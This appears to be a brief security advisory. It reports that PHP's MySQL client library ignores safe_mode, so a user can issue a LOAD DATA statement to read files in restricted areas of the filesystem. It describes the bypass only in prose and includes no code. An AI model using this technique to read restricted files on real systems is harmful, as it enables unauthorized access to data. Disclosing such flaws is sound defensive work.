PHP's 'safe_mode' feature may be used to restrict access to certain areas of a filesystem by PHP scripts. However, a problem has been discovered that may allow an attacker to bypass these restrictions to gain unauthorized access to areas of the filesystem that are restricted when PHP 'safe_mode' is enabled.

In particular, the MySQL client library that ships with PHP fails to properly honor 'safe_mode'. As a result, a user can issue a LOAD DATA statement to read files that reside in restricted areas of the filesystem (as determined by 'safe_mode').
